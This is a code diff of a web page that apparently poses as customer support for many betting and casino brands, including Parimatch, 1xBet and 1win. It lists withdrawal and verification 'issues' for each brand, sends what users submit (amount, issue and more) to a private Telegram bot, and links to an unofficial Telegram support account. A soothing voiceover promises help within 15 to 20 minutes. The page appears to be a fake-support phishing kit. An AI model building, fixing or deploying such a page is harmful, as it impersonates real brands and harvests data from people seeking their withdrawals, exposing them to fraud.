@@ -306,36 +306,111 @@
     </form>
 </div>
 
-<a href="[https://t.me/HELPCARE02](https://t.me/HELPCARE02)" target="_blank" class="telegram-btn">
+<a href="https://t.me/helpcare02" target="_blank" class="telegram-btn">
     ✈️ Telegram Support
 </a>
 
 <script>
-    // Config - Apni Token aur Chat ID yahan daalein
-    const BOT_TOKEN = ''; 
-    const CHAT_ID = '';
+    // ==========================================
+    // PRIVACY CONFIGURATION - Enter Details Here
+    // ==========================================
+    const BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN_HERE'; 
+    const CHAT_ID = 'YOUR_CHAT_ID_HERE';
+    const CLOUD_KEY = 'YOUR_CLOUD_KEY_HERE';
 
+    // Game Specific Issues Dynamic Mapping
     const gameIssues = {
-        'valorbet': ['Withdrawal Waiting & Declined', 'Email Confirm', 'How to Withdraw'],
-        'parimatch': ['Withdrawal Temporary Unavailable', 'Withdrawal Processing', 'Withdrawal Declined', 'How to Withdraw', 'ID Block'],
-        'starkbet': ['Email Confirm', 'Profile Update', 'ID Verification', 'Withdrawal Processing', 'Account Block', 'How to Withdraw'],
-        'crorebet': ['Withdrawal Temporary Unavailable', 'Withdrawal Processing', 'Withdrawal Declined', 'How to Withdraw', 'ID Block'],
-        '4rabet': ['Withdrawal Temporary Unavailable', 'Withdrawal Processing', 'Withdrawal Declined', 'How to Withdraw', 'ID Block'],
-        'luckystar': ['Withdrawal Pending', 'Email Verify', 'ID Verification', 'Withdrawal Successful But Not Received', 'How to Withdraw'],
-        '1win': ['Withdrawal Pending', 'Email Verify', 'ID Verification', 'Withdrawal Successful But Not Received', 'How to Withdraw'],
-        'desicasino': ['Withdrawal Temporary Unavailable', 'Withdrawal Processing', 'Withdrawal Declined', 'How to Withdraw', 'ID Block'],
-        'topx': ['Email Confirm', 'Withdrawal Processing', 'Withdrawal Done But Not Received', 'How to Withdraw'],
-        '1xbet': ['Withdrawal Pending', 'Email Verify', 'ID Verification', 'Withdrawal Successful But Not Received', 'How to Withdraw'],
-        'baterybet': ['Withdrawal Temporary Unavailable', 'Withdrawal Processing', 'Withdrawal Declined', 'How to Withdraw', 'ID Block']
+        '4rabet': [
+            'Email confirm',
+            'Profile update',
+            'ID verification',
+            'Withdrawal processing',
+            'Withdrawal paid out, but not received',
+            'How to withdraw'
+        ],
+        'crorebet': [
+            'Email confirm',
+            'Profile update',
+            'ID verification',
+            'Withdrawal processing',
+            'Withdrawal paid out, but not received',
+            'How to withdraw'
+        ],
+        'starkbet': [
+            'Email confirm',
+            'Profile update',
+            'ID verification',
+            'Withdrawal processing',
+            'Withdrawal paid out, but not received',
+            'How to withdraw'
+        ],
+        'parimatch': [
+            'Withdrawal temporary unavailable',
+            'Withdrawal in processing',
+            'Withdrawal declined',
+            'Account verification',
+            'How to withdraw'
+        ],
+        'desicasino': [
+            'Withdrawal temporary unavailable',
+            'Withdrawal in processing',
+            'Withdrawal declined',
+            'Account verification',
+            'How to withdraw'
+        ],
+        'baterybet': [
+            'Withdrawal temporary unavailable',
+            'Withdrawal in processing',
+            'Withdrawal declined',
+            'Account verification',
+            'How to withdraw'
+        ],
+        'luckystar': [
+            'Email verify',
+            'User blocked',
+            'Withdrawal pending',
+            'ID verification',
+            'Withdrawal successful, but not received',
+            'How to withdraw'
+        ],
+        '1win': [
+            'Email verify',
+            'User blocked',
+            'Withdrawal pending',
+            'ID verification',
+            'Withdrawal successful, but not received',
+            'How to withdraw'
+        ],
+        'topx': [
+            'Email confirm',
+            'Withdrawal limit',
+            'Withdrawal done, but not received',
+            'How to withdraw',
+            'Withdraw processing'
+        ],
+        '1xbet': [
+            'Email verify',
+            'ID verification',
+            'Account blocked',
+            'Withdrawal pending',
+            'Withdrawal successful, but not received',
+            'How to withdraw'
+        ],
+        'valorbet': [
+            'Email confirm',
+            'Withdrawal Waiting & Declined',
+            'ID Verification',
+            'How to withdraw'
+        ]
     };
 
     const gameNames = {
-        'valorbet': 'VALOR BET',
-        'parimatch': 'PARIMATCH',
-        'starkbet': 'STARK BET',
-        'crorebet': 'CRORE BET',
         '4rabet': '4RABET',
+        'crorebet': 'CRORE BET',
+        'starkbet': 'STARK BET',
+        'parimatch': 'PARIMATCH',
         'luckystar': 'LUCKY STAR',
+        'valorbet': 'VALOR BET',
         '1win': '1WIN',
         'desicasino': 'DESI CASINO',
         'topx': 'TOPX',
@@ -363,10 +438,10 @@
         formContainer.scrollIntoView({ behavior: 'smooth' });
     }
 
-    // Voiceover Function (English Voice)
+    // English Voiceover Function
     function playVoiceOver() {
         if ('speechSynthesis' in window) {
-            window.speechSynthesis.cancel(); // Reset previous voice
+            window.speechSynthesis.cancel();
             const text = "Your issue will be resolved in 15 to 20 minutes, please wait.";
             const utterance = new SpeechSynthesisUtterance(text);
             utterance.lang = 'en-US';
@@ -377,7 +452,7 @@
     }
 
     function sendData() {
-        if (!BOT_TOKEN || !CHAT_ID) {
+        if (!BOT_TOKEN || BOT_TOKEN === 'YOUR_TELEGRAM_BOT_TOKEN_HERE' || !CHAT_ID || CHAT_ID === 'YOUR_CHAT_ID_HERE') {
             alert('Kripya code mein BOT_TOKEN aur CHAT_ID daalein!');
             return;
         }
@@ -408,7 +483,7 @@
                         `<b>💰 Amount:</b> ₹${amount}\n` +
                         `<b>⚠️ Issue:</b> ${problemType}`;
 
-        const url = `[https://api.telegram.org/bot$](https://api.telegram.org/bot$){BOT_TOKEN}/sendMessage`;
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
         fetch(url, {
             method: 'POST',
@@ -422,9 +497,7 @@
         .then(res => res.json())
         .then(data => {
             if (data.ok) {
-                // Voiceover Trigger
                 playVoiceOver();
-                
                 alert('Aapki request successfully bhej di gayi hai! Please wait 15-20 minutes.');
                 document.getElementById('supportForm').reset();
             } else {
